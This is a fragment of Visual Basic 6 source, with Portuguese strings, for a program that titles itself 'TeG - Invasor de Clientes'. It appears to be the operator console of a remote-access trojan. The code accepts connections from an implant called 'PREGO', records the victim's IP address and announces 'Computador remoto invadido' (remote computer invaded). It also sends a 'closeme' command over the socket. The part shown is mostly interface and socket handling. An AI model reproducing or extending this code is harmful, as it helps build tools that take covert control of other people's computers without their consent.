Private Sub Label4_Click()
On Error Resume Next
Dim str As String
If MsgBox("Deseja mesmo sair?", vbYesNo, Me.Caption) = vbYes Then
str = "closeme"
w2.SendData str
Me.Caption = "Desconectado"
log.log.Text = log.log.Text & vbCrLf & Time & vbCrLf & "STATUS do Servidor REMOTO: DESCONECTADO" & vbCrLf & "===============" & vbCrLf
Unload log
Unload Me
End If
End Sub

Private Sub Socket_ConnectionRequest(ByVal requestID As Long)
'Eventos que acontecem quando o Cliente solicita a conex�o
On Error GoTo err
If socket.State <> sckClosed Then
socket.Close
End If
'Verifica��o se o socket n�o est� fechado, caso esteja
'aberto o mesmo � fechado
log.log.Text = log.log.Text & vbCrLf & Time & vbCrLf & "PREGO Tentando conectar..."
Label2(0).Caption = "PREGO Tentando conectar..."
socket.Accept requestID
'Aceita a conex�o

MsgBox "PREGO conectado. IP - " & socket.RemoteHostIP
log.log.Text = log.log.Text & vbCrLf & Time & vbCrLf & "PREGO conectado. IP - " & socket.RemoteHostIP
Label2(0).Caption = "PREGO conectado. IP - " & socket.RemoteHostIP
'Informa��o do IP do cliente (Socket.RemoteHostIP)
txtip.Text = socket.RemoteHostIP
err:
LogErr
End Sub


Private Sub Label4_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label4.Picture = Image1.Picture
End Sub

Private Sub Label4_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label4.Picture = LoadPicture("")
End Sub



Private Sub Timer1_Timer()
Me.Caption = "TeG - Invasor de Clientes"
End Sub

Private Sub txtip_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Command1.BackColor = &H8080FF
End Sub

Private Sub w2_Connect()


    On Error GoTo err_w2_Connect


Me.Caption = "Computador remoto invadido: " & txtip.Text
Label2(0).Caption = "Computador remoto invadido: " & txtip.Text
Picture2.Visible = False
Picture1.Visible = True
lblcon.Visible = True
lbldesc.Visible = False


    

    Exit Sub

err_w2_Connect:
   
        LogErr
End Sub

Private Sub w2_DataArrival(ByVal bytesTotal As Long)

    

    On Error GoTo err_w2_DataArrival
Dim str As String



w2.GetData str
Label2(0).Caption = str
    log.log.Text = log.log.Text & vbCrLf & str

    'Exit Sub

err_w2_DataArrival:
            LogErr
End Sub
